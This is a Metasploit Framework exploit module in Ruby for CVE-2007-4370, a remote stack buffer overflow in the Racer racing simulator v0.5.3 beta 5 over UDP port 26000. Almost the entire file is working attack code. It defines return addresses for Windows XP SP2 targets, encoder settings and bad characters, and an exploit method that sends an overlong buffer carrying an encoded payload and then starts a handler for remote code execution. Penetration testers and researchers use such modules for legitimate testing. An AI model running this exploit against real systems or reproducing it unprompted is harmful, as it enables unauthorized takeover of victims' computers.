##
# $Id: racer_503beta5.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Racer v0.5.3 beta 5 Buffer Overflow',
			'Description'    => %q{
					This module explots the Racer Car and Racing Simulator game
				versions v0.5.3 beta 5 and earlier. Both the client and server listen
				on UDP port 26000. By sending an overly long buffer we are able to
				execute arbitrary code remotely.
			},
			'Author'         => [ 'Trancek <trancek[at]yashira.org>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'CVE', '2007-4370' ],
					[ 'OSVDB', '39601' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/4283' ],
					[ 'BID', '25297' ],
				],
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x5c\x00",
					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Tested ok patrickw 20090503
					[ 'Fmodex.dll - Universal', { 'Ret' => 0x10073FB7 } ], # jmp esp
					[ 'Win XP SP2 English', { 'Ret' => 0x77d8af0a } ],
					[ 'Win XP SP2 Spanish', { 'Ret' => 0x7c951eed } ],
				],
			'DisclosureDate' => 'Aug 10 2008',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(26000)
			], self.class)
	end

	def exploit
		connect_udp

		buf = Rex::Text.rand_text_alphanumeric(1001)
		buf << [target.ret].pack('V')
		buf << payload.encoded
		buf << Rex::Text.rand_text_alphanumeric(1196 - payload.encoded.length)

		udp_sock.put(buf)

		handler
		disconnect_udp
	end
end
